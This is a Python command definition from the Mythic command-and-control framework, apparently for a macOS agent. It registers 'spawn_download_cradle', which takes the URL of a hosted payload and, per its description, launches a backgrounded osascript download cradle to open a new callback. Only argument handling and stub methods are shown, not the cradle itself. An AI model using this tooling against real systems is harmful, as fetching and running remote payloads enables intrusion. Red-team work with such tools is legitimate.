from CommandBase import *
import json


class SpawnDownloadCradleArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "url": CommandParameter(
                name="url",
                type=ParameterType.String,
                description="full URL of hosted payload",
            )
        }

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("url", self.command_line)
        else:
            raise ValueError("Missing arguments")


class SpawnDownloadCradleCommand(CommandBase):
    cmd = "spawn_download_cradle"
    needs_admin = False
    help_cmd = "spawn_download_cradle"
    description = "Spawn a new osascript download cradle as a backgrounded process to launch a new callback"
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_remove_file = False
    is_upload_file = False
    author = "@its_a_feature_"
    attackmapping = []
    argument_class = SpawnDownloadCradleArguments

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, response: AgentResponse):
        pass
